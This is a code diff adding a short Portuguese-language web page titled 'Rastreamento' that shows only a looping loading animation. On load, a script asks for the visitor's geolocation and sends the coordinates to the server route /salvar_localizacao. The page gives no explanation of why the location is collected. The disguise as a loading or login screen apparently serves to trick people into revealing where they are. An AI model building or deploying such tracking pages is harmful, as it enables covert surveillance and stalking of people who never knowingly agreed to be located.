@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rastreamento</title>
+    <style>
+        /* Estilo para centralizar o gif na página */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+        }
+        #loadingGif {
+            width: 300px; /* tamanho do gif */
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <!-- Gif de login em loop -->
+    <img id="loadingGif" src="/static/loading.gif" alt="Loading..." />
+    
+    <script>
+        // Função para obter a localização do usuário
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                console.error("Geolocalização não suportada pelo navegador.");
+            }
+        }
+
+        // Função para enviar a localização para o servidor
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const data = {
+                latitude: latitude,
+                longitude: longitude
+            };
+
+            // Envia a localização para a rota "/salvar_localizacao"
+            fetch("/salvar_localizacao", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Localização salva com sucesso!", data);
+            })
+            .catch(error => {
+                console.error("Erro ao enviar a localização", error);
+            });
+        }
+
+        // Função para lidar com erros de geolocalização
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("Usuário negou a permissão de geolocalização.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("A posição geográfica não está disponível.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("A solicitação de geolocalização expirou.");
+                    break;
+                default:
+                    console.error("Erro desconhecido.");
+                    break;
+            }
+        }
+
+        // Chama a função de geolocalização assim que a página é carregada
+        window.onload = function() {
+            getLocation();
+        }
+    </script>
+</body>
+</html>
